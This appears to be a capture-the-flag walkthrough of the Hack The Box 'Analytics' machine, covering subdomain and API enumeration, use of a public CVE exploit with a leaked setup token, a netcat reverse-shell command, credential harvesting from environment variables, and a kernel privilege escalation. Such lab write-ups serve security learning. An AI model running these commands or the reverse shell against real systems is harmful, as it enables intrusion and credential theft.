# :game_die: HTB Analytics Walkthrough

> **Original Source:** [HTB Analytics Walkthrough](https://infosecwriteups.com/htb-analytics-walkthrough-fd256a170fae)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# HTB Analytics Walkthrough


Hello hackers, I want to talk about how to solve Analytics Box in HTB, Let’s get started.


Enumeration


```
sudo nmap -sV -sC -sS -p 22,80 -oA scan/result 10.10.11.233
```


Now we have 2 ports HTTP and SSH let’s see HTTP.


HTTP Enumeration


We have a web application let’s see that.


let’s fuzz to see hidden directories, files, and subdomains, I’ll use Go-buster.


```
gobuster dir --url "<http://analytical.htb/>" -w /usr/share/dirb/wordlists/big.txt
```


This domain is a static website let’s see another subdomain.

## Subdomains Enumeration


```
gobuster DNS -d 'analytical.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```


Great, We found this subdomain `data.analytical.htb` I’ll add this subdomain to the host’s file and visit the website to see what we can do.


After visiting the website, I found the login page and when I tried to log in I found the request sent to this API `[http://data.analytical.htb/api](http://data.analytical.htb/api.)`


I’ll use Go-buster to Fuzzing APIs to see other APIs.


```
gobuster dir --url "<http://data.analytical.htb/api" -w /usr/share/dirb/wordlists/big.txt
```


I found these APIs let’s see them.


After checking all of them I found one API is running but not useful in our pen-testing I’ll go deep into my search.


I’ll use Go-Buster to fuzz this API `http://data.analytical.htb/api/session` and see what we’ll see.


```
gobuster dir --url "<http://data.analytical.htb/api/session" -w /usr/share/dirb/wordlists/big.txt
```


I found this let’s see this API and maybe find anything interesting.


```
curl -s "<http://data.analytical.htb/api/session/properties" | jq .
```


The API is running let’s see this information. After searching in Google I found a public CVE but there is a need to token this we’ll find it in the response API let’s see that.


```
curl -s "<http://data.analytical.htb/api/session/properties" | jq . | grep "setup-token" | cut -d ":" -f 2 | cut -d '"' -f 2
```


Now we have the token let’s exploit CVE.


Now I’ll start to exploit


## Get Sam’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Foothold


```
python3 exploit.py -u "http://data.analytical.htb> -t "249fa03d-fd94-4d5b-b94f-b4ebf3df681f" -c "nc -nv $IP 9001 -e /bin/bash"
```


After searching the server I found We are inside a container let’s see how we can move from this container.


After searching in the system I Found these credentials.


Here the developer adds some variables that can be used in the system to help him.


```
env
cat /proc/self/environ
```


Now we have credentials let’s log in via SSH.


```
ssh metalytics@analytical.htb
```


Now we bypass the container let’s see how we can be root.


Privilege Escalation


After searching, I found an old version of the kernel let’s search on Google to find a public exploit.


After cloning the Repo let’s start the exploit to be a root.


```
./exploit.sh
```


Thanks for reading.

---

*Originally published on [Medium](https://infosecwriteups.com/htb-analytics-walkthrough-fd256a170fae). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
